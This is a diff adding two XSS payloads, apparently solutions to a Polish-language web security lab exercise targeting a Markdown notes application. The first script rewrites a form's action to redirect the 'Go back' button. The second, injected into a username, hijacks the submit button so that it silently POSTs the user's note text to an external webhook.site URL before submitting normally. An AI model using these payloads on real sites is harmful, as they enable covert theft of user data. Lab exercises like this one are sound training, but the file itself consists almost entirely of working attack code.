@@ -1,0 +1,32 @@
+<!--Zadanie 1-->
+<!--Wykonać atak XSS polegający na wstrzyknięciu do wiadomości Markdown kodu JavaScript zmieniającego adres pod który prowadzi przycisk "Go back".-->
+
+<script>
+    window.addEventListener('DOMContentLoaded', (event) => {
+        document.forms[0].action = 'https://google.com/'
+    });
+</script>
+
+<!--Zadanie 2-->
+<!--Wykonać atak XSS polegający na wstrzyknięciu do nazwy użytkownika kodu JavaScript, który nie wpłynie na działanie aplikacji,
+    ale w tle prześle na zewnętrzny serwer treść notatki wprowadzonej przez użytkownika na podstronie /hello (najlepiej wykorzystać webhook.site)-->
+
+User<script>
+    async function FetchData()
+    {
+      await fetch('https://webhook.site/1caa027a-b27e-49b9-a06a-a652bb59cd03', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/text'
+            },
+            body: document.getElementById('markdown').value
+        });
+      document.forms[0].submit();
+    }
+
+    window.addEventListener('DOMContentLoaded', (event) => {
+      document.forms[0].children[4].type='button';
+      document.forms[0].children[4].onclick=FetchData;
+    });
+</script>
